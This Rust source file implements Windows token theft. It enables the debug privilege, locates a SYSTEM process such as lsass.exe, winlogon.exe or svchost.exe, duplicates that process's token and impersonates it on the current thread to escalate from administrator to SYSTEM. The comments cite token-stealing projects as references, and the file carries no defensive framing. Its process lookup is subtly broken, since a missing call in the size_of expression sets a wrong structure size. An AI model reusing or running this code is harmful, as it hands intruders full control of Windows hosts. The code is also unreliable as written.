
use windows::Win32::Foundation::{HANDLE, LUID};
use windows::Win32::Security::{DuplicateTokenEx, LookupPrivilegeValueW, SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED, TOKEN_ALL_ACCESS, SecurityImpersonation, TOKEN_ACCESS_MASK, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY, TokenImpersonation};
use windows::Win32::Security::AdjustTokenPrivileges;
use windows::Win32::Security::LUID_AND_ATTRIBUTES;
use windows::Win32::System::SystemServices::MAXIMUM_ALLOWED;
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, SetThreadToken, PROCESS_QUERY_INFORMATION};
use windows_sys::Win32::System::{Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}};



pub fn get_system(pid: u32) -> Option<HANDLE>{
    // Get system via debug privilege (needs to be administrator), referenced: https://github.com/joaovarelas/steal-token-rs.git returns the HANDLE for the token
    // Needs the PID of a process running as SYSTEM

    unsafe{
        let mut new_token: HANDLE = HANDLE(std::ptr::null_mut());
        

        let mut luid: LUID = LUID{ LowPart: 0, HighPart: 0};
        let mut token_handle: HANDLE = HANDLE(std::ptr::null_mut());
        let proc_handle = GetCurrentProcess();

        if LookupPrivilegeValueW(None, SE_DEBUG_NAME, &mut luid).is_err() {
            print!("cannot lookup privilege!");
            return None;
        }
        let token_priv: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES{PrivilegeCount: 1, Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }]};
        if OpenProcessToken(proc_handle, TOKEN_ALL_ACCESS, &mut token_handle).is_err() {
            println!("Error OpenProcessToken");
            return None;
        }

        if AdjustTokenPrivileges(token_handle, false, Some(&token_priv), 0, None, None).is_err() {
            print!("Cannot Adjust privileges!");
            return  None;
        }


        

        let proc_handle = match OpenProcess(PROCESS_QUERY_INFORMATION, true, pid) {
            Ok(handle) => handle,
            Err(_) => {
                println!("Error OpenProcess");
                return None;
            }
        };

        if OpenProcessToken(proc_handle, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &mut token_handle).is_err() {
            println!("Error OpenProcessToken");
            return None;
        }


        

        if DuplicateTokenEx(token_handle, TOKEN_ACCESS_MASK(MAXIMUM_ALLOWED), None, SecurityImpersonation, TokenImpersonation, &mut new_token).is_err() {
            println!("Error DuplicateTokenEx");
            return None;
        }


        if SetThreadToken(None, Some(new_token)).is_err() {
            println!("Error SetThreadToken");
            return None;
        }
        
        return Some(new_token);
    }
    

}
pub fn array_to_string(buffer: [u8; 260]) -> String {
    let mut string: Vec<u8> = Vec::new();
    for char in buffer.to_vec() {
        if char == 0 {
            break;
        }
        string.push(char);
    }
    String::from_utf8(string).unwrap()
}


pub fn getSysProcess() -> u32 {
    // referenced: https://github.com/zblurx/impersonate-rs/blob/cc2c53e7abd204b6ffd370b5364432eabbe1b349/src/utils/token.rs#L39
    let mut sysPID: u32 = 0;
    unsafe {
        let hsnapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        let mut lppe: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>();
        lppe.dwSize = size_of::<PROCESSENTRY32> as u32;

        if Process32First(hsnapshot, &mut lppe) != 0 {
            loop {
                if Process32Next(hsnapshot, &mut lppe) == 0 {
                    // No more process in list
                    return sysPID;
                };

                // Check if process is in blacklist
                let blacklist = vec!["lsass.exe","winlogon.exe","svchost.exe"];
                if blacklist.iter().any(|&i| i == array_to_string(lppe.szExeFile)){
                    // println!("Process in blacklist, continue...");
                    sysPID = lppe.th32ProcessID;
                    break;
                }
                // let process_name = array_to_string(lppe.szExeFile);
                // let blacklist = vec!["lsass.exe","winlogon.exe","svchost.exe"];

            }
        }

    }
    return sysPID;
}